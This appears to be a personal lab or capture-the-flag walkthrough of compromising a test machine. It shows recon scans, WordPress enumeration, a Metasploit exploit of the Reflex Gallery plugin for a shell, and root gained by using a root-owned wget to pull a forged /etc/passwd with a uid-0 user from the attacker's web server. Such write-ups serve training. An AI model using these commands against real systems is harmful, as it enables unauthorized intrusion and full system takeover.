ifconfig -> myIP = 192.168.56.125

netdiscover -r 192.168.56.0/24 -i eth1
	targetIP = 192.168.56.126

nmap -sC -sV -A -T4 -p- 192.168.56.126
	Just port 80
start a nikto and dirb
	dirb http://192.168.56.126/
	nikto -h 192.168.56.126

Start taking a look around the website while those run
Default apache page
Nikto finds a notes.txt, has a hint to unzip something

dirb finds a wordpress site, bingo
192.168.56.126/wordpress

let's run a wpscan

wpscan --url 192.168.56.126/wordpress -ep

Finds an out of date plugin called Reflex Gallery 3.1.3

searchsploit reflex -> RCE with and without MS

Using MSF method

msfdb run

workspace -a wordy

search reflex

use exploit/unix/webapp/wp_reflexgallery_file_upload

options

set rhosts 192.168.56.126
set targeturi /wordpress
run

get a meterpreter shell hell ye

let's drop into a regular shell

shell

python3 --version
	3.6.8 cool lets get a tty
python3 -c 'import pty; pty.spawn("/bin/bash")'

bash shell nice. let's go look for user flag
cd /home
cd raj
cat flag1.txt (nice)

let's see what has root permissions

find / -user root -perm -4000 2>/dev/null

we have wget as root...how can we use this to our advantage?
let's overwrite the /etc/passwd file with a root user we add to it.

first cat /etc/passwd and copy all the entries

Go back to target machine and make a file called 'passwd'
Now let's generate a hashed password using openssl
Making a user called lol let's do

openssl passwd -1 -salt lol password
outputted is the hash we will put in our /etc/passwd
	-> $1$lol$nT3A6TjHyPCMuivziR8Y50

Now let's put our entry in /etc/passwd
lol:$1$lol$nT3A6TjHyPCMuivziR8Y50:0:0:root:/root:/bin/bash

cool now let's host it on a simple http python server and wget it to overwrite the machines /etc/passwd

on attacking machine, python -m SimpleHTTPServer
Now back on the victim machine, let's get that file
cd /etc/
wget -O passwd http://192.168.56.125:8000/passwd

Great now the user lol is in the system with password  password as root
let's switch user to it

su lol
password

boom root

cd /root

cat proof.txt
niiiiiiiiiiiiiice

Theres other wp plugins that were vulnerable but this was the first one so I just chose to that one. Also, I want to go back and do it without msf just to practice for OSCP, but that's for another day.
